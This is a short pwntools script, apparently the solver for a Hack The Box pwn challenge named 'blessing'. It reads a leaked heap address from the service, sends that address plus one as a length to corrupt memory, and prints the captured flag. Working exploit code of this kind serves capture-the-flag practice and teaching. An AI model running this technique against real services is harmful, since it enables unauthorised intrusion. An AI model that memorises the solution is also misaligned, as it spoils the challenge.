#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './blessing' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Leak address
r.recvuntil('this: ')
leak = int(r.recv(14), 16)
print(f'Leaked address: {leak:#04x}')

# Send leaked address + 1
r.sendlineafter('length: ', str(leak + 1))
r.sendlineafter('song: ', 'pwned');

print(f'\nFlag --> {r.recvline_contains("HTB").decode()}\n')
